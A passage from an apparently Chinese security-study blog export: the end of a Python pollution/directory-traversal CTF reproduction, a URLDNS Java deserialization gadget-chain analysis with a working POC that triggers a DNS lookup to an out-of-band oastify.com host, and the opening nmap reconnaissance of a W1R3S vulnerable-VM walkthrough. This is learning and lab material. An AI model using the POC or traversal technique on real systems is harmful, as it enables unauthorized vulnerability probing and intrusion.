<p>但是directory是一个对象，而它之前的值就是由其中的<strong>parts</strong>属性决定的，但是由于这个属性是一个tuple，不能直接被污染，所以我们需要找到这个属性是如何被赋值的?（这里我们需要知道tuple(元组：元组是 Python 中的一种数据结构，用于存储多个元素。与列表类似，元组也是一个序列，但与列表不同的是，元组是不可变的。这意味着元组一旦创建，其内容不能修改)）</p>
<p>所以不能直接污染directory </p>
<p>但在DirectoryHandler类中有Directory属性可以从这入手进入path对象parts的值最后是给了_parts这个属性发现是list</p>
<p>最终污染成&#x2F;就成功了</p>
<p>到时候要去复现下国赛ciscn毕竟那天坐了一天牢</p>
<p>到这还没完还没</p>
<p>我们继续看DirectoryHandler类中handle方法中的逻辑:</p>
<p>当我们开启列目录功能后，就会进入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable language_">self</span>._index(    <span class="variable language_">self</span>.directory / current, path, request.app.debug )</span><br></pre></td></tr></table></figure>

<p>解决上面遗留的问题就是从这开始发现这个目录路径是由Parts+current拼接出来的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">self</span>.directory / current,path, request.app .debug</span><br></pre></td></tr></table></figure>

<p>目的就是让current变成.. 实现目录穿越</p>
<p>看下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(<span class="variable language_">self</span>.base) :].strip(<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从给定的路径中去除基本路径（`self.base`），然后返回剩余路径。首先，`path.strip(&quot;/&quot;)` 去除路径两端的斜杠，然后`[len(self.base):]` 取基本路径之后的部分，最后`.strip(&quot;/&quot;)` 再次去除剩余路径两端的斜杠</span><br><span class="line"></span><br><span class="line">#可以看到current的值就是由path和base两个值决定的</span><br></pre></td></tr></table></figure>

<p>self.base是可控的</p>
<p><strong>那么我们就得构造current的值</strong></p>
<p>关键就在于下面</p>
<p>所以实现目录穿越只要让path的值为static&#x2F;一个目录&#x2F; current值为..就好了</p>
<p>但是这个目录怎么来？</p>
<p><strong>file_or_directory</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以改变静态文件的默认路径</span><br><span class="line"></span><br><span class="line">我们只需要通过这个改变到其他目录，该目录下存在其他目录不就好了</span><br></pre></td></tr></table></figure>

<p>它可以改变static的默认路径</p>
<p>这就是上面为什么需要传入恶意的key,目的就是让日志记录，获得一个报错的目录</p>
<p>继续改变目录位置（上面改的是&#x2F;tmp）然后修改其base的值为自己报错的目录</p>
<p>就看实现目录穿越了</p>
<p>ile_or_directory只是改变它识别的路径，并不会改变</p>
<p>self.directory中parts的值，这个列目录的值依旧是默认的</p>
]]></content>
      <categories>
        <category>pollute</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>URLDNS</title>
    <url>/2025/03/23/URLDNS/</url>
    <content><![CDATA[<h1 id="URLDNS-链子分析"><a href="#URLDNS-链子分析" class="headerlink" title="URLDNS 链子分析"></a>URLDNS 链子分析</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line"> *     HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br></pre></td></tr></table></figure>

<p>原理：</p>
<p><code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求.</p>
<p>在利用yso生成链子的时候先从GeneratPayload.class触发</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GeneratePayload</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">INTERNAL_ERROR_CODE</span> <span class="operator">=</span> <span class="number">70</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">USAGE_CODE</span> <span class="operator">=</span> <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GeneratePayload</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length != <span class="number">2</span>) &#123;</span><br><span class="line">            printUsage();</span><br><span class="line">            System.exit(<span class="number">64</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadType</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ObjectPayload</span>&gt; payloadClass = Utils.getPayloadClass(payloadType);</span><br><span class="line">        <span class="keyword">if</span> (payloadClass == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Invalid payload type &#x27;&quot;</span> + payloadType + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            printUsage();</span><br><span class="line">            System.exit(<span class="number">64</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectPayload</span> <span class="variable">payload</span> <span class="operator">=</span> (ObjectPayload)payloadClass.newInstance();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line">                <span class="type">PrintStream</span> <span class="variable">out</span> <span class="operator">=</span> System.out;</span><br><span class="line">                Serializer.serialize(object, out);</span><br><span class="line">                Utils.releasePayload(payload, object);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var7) &#123;</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">e</span> <span class="operator">=</span> var7;</span><br><span class="line">                System.err.println(<span class="string">&quot;Error while generating or serializing payload&quot;</span>);</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                System.exit(<span class="number">70</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>然后add添加之后，调用新实例化对象的getObject方法,后面调试跳到了URLDNS.java，且实现了ObjectPayload接口，里面也确实有getObject方法：</p>
<p>重点代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();<span class="comment">//创建一个返回URLStreamHandler名为handler的实例SilentURLStreamHandler()</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();<span class="comment">//创建一个返回HashMap名为ht的实例HashMap()</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>((URL)<span class="literal">null</span>, url, handler);<span class="comment">//创建一个返回URL名字为u的实力URL,并且使用指定构造函数URL(URL context, String spec, URLStreamHandler handler)</span></span><br><span class="line">ht.put(u, url);<span class="comment">//这一行将 URL 对象 u 和对应的 url 字符串存入 HashMap ht</span></span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);<span class="comment">//这一行通过反射机制将 URL 对象 u 的 hashCode 字段值设置为 -1（因为 -1 通常表示未初始化的状态）</span></span><br><span class="line"><span class="keyword">return</span> ht;<span class="comment">//返回值ht</span></span><br></pre></td></tr></table></figure>

<p>URLStreamHandler 是 Java 中的一个抽象类，用于处理 URL 的协议部分，例如 HTTP、HTTPS、FTP 等。</p>
<p>HashMap 是 Java 中的一种集合类，属于 java.util 包，用于存储键值对（key-value pairs）。</p>
<p>在这里，ht 是一个空的 HashMap，后续将被用来存储 URL 对象和对应的 URL 字符串。</p>
<p>Reflections 可能是一个工具类（例如来自某个库，如 org.reflections），用于简化 Java 反射操作。它的 setFieldValue 方法通过反射修改对象的字段值。</p>
<p>在 Java 的 URL 类中，hashCode 是一个私有字段，用于缓存该 URL 的哈希码。URL 类的 hashCode() 方法会计算并缓存这个值，以便在集合操作（如 HashMap 的键比较）中快速使用。</p>
<p>将 hashCode 设置为 -1 的目的可能是：</p>
<ul>
<li>强制 URL 对象在下次调用 hashCode() 时重新计算哈希码（因为 -1 通常表示未初始化的状态）。</li>
</ul>
<p>hashcode计算，判断如果不是-1，则直接返回，表示已经算过了，是-1则继续计算；还有需要注意的这个接口中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler; <span class="comment">//这个URL传输实现类是一个transient临时类型，它不会被反序列化 </span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> -<span class="number">1</span>;<span class="comment">//hashCode是private类型，需要手动开放控制权才可以修改。</span></span><br></pre></td></tr></table></figure>

<p>首先调用HashMap的put方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会通过hash函数调用<code>key.hashCode()</code>计算key的hashCode;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>key是传入的URL对象，最终调用URL对象的hashCode函数，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125; 	</span><br></pre></td></tr></table></figure>

<p><code>handler</code>是<code>URLStreamHandler</code>的对象；handler在构造函数时被赋值了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler</span><br></pre></td></tr></table></figure>

<p>接着调用了<code>URLStreamHandler.hashCode</code>中的<code>getHostAddress(u)</code>方法导致DNS解析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line"><span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">    h += addr.hashCode();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">        h += host.toLowerCase().hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://5msdqvjsda7s3f8m8h0vkcsmgdm4avyk.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">2</span>); <span class="comment">//为了防止在put时就发起DNS请求，将hashCode的默认值-1改掉，执行不了handler.hashCode(this)</span></span><br><span class="line"></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结 </p>
<p>形象的举个例子</p>
<h3 id="埋雷：构造一个带“陷阱”的快递（序列化）"><a href="#埋雷：构造一个带“陷阱”的快递（序列化）" class="headerlink" title="埋雷：构造一个带“陷阱”的快递（序列化）"></a><strong>埋雷：构造一个带“陷阱”的快递（序列化）</strong></h3><ul>
<li><strong>陷阱核心</strong>：把URL对象（比如<code>http://xxx.dnslog.cn</code>）塞进HashMap里当“钥匙”（Key），然后序列化这个HashMap。</li>
</ul>
<p><strong>防止提前触发</strong>：URL对象默认会立即查DNS，但黑客用反射修改<code>hashCode</code>属性为123（临时值），避免序列化时触发DNS</p>
<h3 id="寄快递：发送包裹到目标（传输数据）"><a href="#寄快递：发送包裹到目标（传输数据）" class="headerlink" title="寄快递：发送包裹到目标（传输数据）"></a><strong>寄快递：发送包裹到目标（传输数据）</strong></h3><ul>
<li><strong>数据伪装</strong>：序列化后的HashMap看起来是普通数据，被发送到目标服务器（比如通过接口、文件上传等途径）。</li>
</ul>
<h3 id="拆快递：目标拆包裹触发陷阱（反序列化）"><a href="#拆快递：目标拆包裹触发陷阱（反序列化）" class="headerlink" title="拆快递：目标拆包裹触发陷阱（反序列化）"></a><strong>拆快递：目标拆包裹触发陷阱（反序列化）</strong></h3><p><strong>自动拆包</strong>：服务器反序列化时，会调用HashMap的<code>readObject</code>方法，这是Java默认的反序列化逻辑。</p>
<p><strong>计算“钥匙”哈希值</strong>：</p>
<p>HashMap会重新计算每个Key的哈希值（<code>hash(key)</code>）</p>
<ul>
<li>此时Key是之前埋入的URL对象，于是调用URL的<code>hashCode()</code>方法。</li>
</ul>
<h3 id="查地址：触发DNS请求（核心利用）"><a href="#查地址：触发DNS请求（核心利用）" class="headerlink" title="查地址：触发DNS请求（核心利用）"></a><strong>查地址：触发DNS请求（核心利用）</strong></h3><p><strong>URL的陷阱逻辑</strong></p>
<p>URL的<code>hashCode</code>发现自己的<code>hashCode</code>是-1（反射改回的初始值），于是调用<code>URLStreamHandler.hashCode()</code></p>
<p>这个方法内部会解析URL的主机名（如<code>xxx.dnslog.cn</code>），调用<code>InetAddress.getByName()</code>发起DNS查询</p>
<p><strong>结果反馈</strong>：DNS查询记录会被攻击者的监控平台（如DNSLog）捕获，证明目标存在反序列化漏洞</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>lW1R3S 1.0.1</title>
    <url>/2025/03/25/W1R3S%201.0.1/</url>
    <content><![CDATA[<p>下载好靶机 </p>
<p>然后先在本地进行扫描确定靶机的ip地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 192.168.205.0/24</span><br></pre></td></tr></table></figure>

<p>发现</p>
<p>Starting Nmap 7.95 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2025-03-25 04:03 EDT<br>Nmap scan report for 192.168.205.1 (192.168.205.1)<br>Host is up (0.0012s latency).<br>MAC Address: 00:50:56:C0:00:01 (VMware)<br>Nmap scan report for 192.168.205.2 (192.168.205.2)<br>Host is up (0.00089s latency).<br>MAC Address: 00:50:56:F7:4F:9C (VMware)<br>Nmap scan report for 192.168.205.136 (192.168.205.136)<br>Host is up (0.00074s latency).<br>MAC Address: 00:0C:29:19:D7:D3 (VMware)<br>Nmap scan report for 192.168.205.254 (192.168.205.254)<br>Host is up (0.00077s latency).<br>MAC Address: 00:50:56:E0:48:99 (VMware)<br>Nmap scan report for 192.168.205.128 (192.168.205.128)<br>Host is up.<br>Nmap done: 256 IP addresses (5 hosts up) scanned in 2.00 seconds</p>
<p>这条命令等同于 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>

<p>Interface: eth0, type: EN10MB, MAC: 00:0c:29:e7:49:b2, IPv4: 192.168.205.128<br>WARNING: Cannot open MAC&#x2F;Vendor file ieee-oui.txt: Permission denied<br>WARNING: Cannot open MAC&#x2F;Vendor file mac-vendor.txt: Permission denied<br>Starting arp-scan 1.10.0 with 256 hosts (<a href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a>)<br>192.168.205.1   00:50:56:c0:00:01       (Unknown)<br>192.168.205.2   00:50:56:f7:4f:9c       (Unknown)<br>192.168.205.136 00:0c:29:19:d7:d3       (Unknown)<br>192.168.205.254 00:50:56:e0:48:99       (Unknown)</p>
<p>136是我们的靶机地址</p>
<p>接下来我们对这个地址进行一个tcp的扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.205.136 -oA  nmapscan/ports</span><br></pre></td></tr></table></figure>

<p>Starting Nmap 7.95 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2025-03-25 04:17 EDT<br>Nmap scan report for 192.168.205.136 (192.168.205.136)<br>Host is up (0.00034s latency).<br>Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>21&#x2F;tcp   open  ftp<br>22&#x2F;tcp   open  ssh<br>80&#x2F;tcp   open  http<br>3306&#x2F;tcp open  mysql<br>MAC Address: 00:0C:29:19:D7:D3 (VMware)</p>
<p>发现4个端口</p>
<p>-oA  nmapscan&#x2F;ports 这里是为了数据化扫描结果</p>
<p>如果扫描过程中遇到的端口数量过大的情况下我们就可以进行一个筛选</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap</span><br></pre></td></tr></table></figure>

<p>21&#x2F;tcp   open  ftp<br>22&#x2F;tcp   open  ssh<br>80&#x2F;tcp   open  http<br>3306&#x2F;tcp open  mysql</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap |awk -F<span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">80</span></span><br><span class="line"><span class="number">3306</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里用来提权端口（这一切都是基于如果扫描出来的端口数量过大的情况下，我们需要，这里为了养成习惯所以细致一些）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap |awk -F&#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27;|paste -sd &#x27;,&#x27;</span><br><span class="line">21,22,80,3306</span><br></pre></td></tr></table></figure>

<p>将端口提取到一行</p>
<p>将这些赋值给port的变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ports=$(grep open nmapscan/ports.nmap |awk -F&#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27;|paste -sd &#x27;,&#x27;)</span><br></pre></td></tr></table></figure>

<p>接下来对其进行详细信息扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.205.136 -oA nmapscan/detail</span><br></pre></td></tr></table></figure>

<p>-sV是对网站信息进行扫描，-sC是默认脚本 -O是操作系统 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.205.128</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</span><br><span class="line">|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)</span><br><span class="line">|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)</span><br><span class="line">|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 5.1 - 5.15 (95%), Linux 3.13 - 4.4 (93%), Linux 3.8 - 3.16 (93%), Linux 4.10 (93%), Linux 3.4 - 3.10 (93%), Linux 3.10 (93%), Linux 3.13 - 3.16 (92%), Linux 4.4 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.41 seconds</span><br></pre></td></tr></table></figure>

<p>在扫描的过程中我们可以进行一下udp的一个扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sU --top-ports 20 192.168.205.136 -oA nmapscan/udp</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 05:22 EDT</span><br><span class="line">Nmap scan report for 192.168.205.136 (192.168.205.136)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">53/udp    open|filtered domain</span><br><span class="line">67/udp    open|filtered dhcps</span><br><span class="line">68/udp    open|filtered dhcpc</span><br><span class="line">69/udp    open|filtered tftp</span><br><span class="line">123/udp   open|filtered ntp</span><br><span class="line">135/udp   open|filtered msrpc</span><br><span class="line">137/udp   open|filtered netbios-ns</span><br><span class="line">138/udp   open|filtered netbios-dgm</span><br><span class="line">139/udp   open|filtered netbios-ssn</span><br><span class="line">161/udp   open|filtered snmp</span><br><span class="line">162/udp   open|filtered snmptrap</span><br><span class="line">445/udp   open|filtered microsoft-ds</span><br><span class="line">500/udp   open|filtered isakmp</span><br><span class="line">514/udp   open|filtered syslog</span><br><span class="line">520/udp   open|filtered route</span><br><span class="line">631/udp   open|filtered ipp</span><br><span class="line">1434/udp  open|filtered ms-sql-m</span><br><span class="line">1900/udp  open|filtered upnp</span><br><span class="line">4500/udp  open|filtered nat-t-ike</span><br><span class="line">49152/udp open|filtered unknown</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.72 second</span><br></pre></td></tr></table></figure>

<p>还有进行nmap 漏洞脚本进行扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> sudo nmap --script=vuln -p21,80,22,3306 192.168.205.136 -oA nmapscan/vuln</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 05:25 EDT</span><br><span class="line">Nmap scan report for 192.168.205.136 (192.168.205.136)</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 322.12 seconds</span><br></pre></td></tr></table></figure>

<p>这里没有发现可利用漏洞 ddos就不考虑了 </p>
<p>然后分析刚刚的详细扫描</p>
<p>21&#x2F;tcp   open  ftp     vsftpd 2.0.8 or later</p>
